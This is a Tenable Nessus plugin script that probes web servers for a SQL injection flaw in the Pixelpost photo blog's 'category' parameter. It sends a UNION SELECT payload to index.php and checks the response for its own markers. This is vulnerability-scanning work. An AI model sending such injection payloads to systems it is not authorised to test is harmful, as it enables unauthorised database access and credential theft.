#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21645);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2889", "CVE-2006-2890");
  script_bugtraq_id(18276);

  script_name(english:"Pixelpost category Parameter SQL Injection Vulnerability");
  script_summary(english:"Tries to exploit SQL injection issue in Pixelpost");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The remote host is running Pixelpost, a photo blog application based
on PHP and MySQL. 

The version of Pixelpost installed on the remote fails to sanitize
user-supplied input to the 'category' parameter of the 'index.php'
script before using it to construct database queries.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated attacker
can exploit this flaw to manipulate database queries and, for example,
uncover the administrator's username and password hash, which can
later be used to gain administrative access to the affected
application. 

In addition, Pixelpost reportedly suffers from a similar issue
involving the 'archivedate' parameter of the 'index.php' script. 

See also :

http://www.securityfocus.com/archive/1/435856/30/60/threaded
http://forum.pixelpost.org/showthread.php?t=4331

Solution :

Apply the patches listed in the vendor forum post referenced above. 

Risk factor : 

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/pixelpost", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  now = unixtime();
  exploit = string("UNION SELECT '1','2','", SCRIPT_NAME, "','", now, "','5'/*");
  req = http_get(
    item:string(
      dir, "/index.php?",
      "x=browse&",
      "category='", urlencode(str:exploit)
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if the time is used in the thumbnail name and 
  # our script name for an alt tag.
  if (string("<img src='thumbnails/thumb_", now, "' alt='", SCRIPT_NAME) >< res)
  {
    security_warning(port);
    exit(0);
  }
}
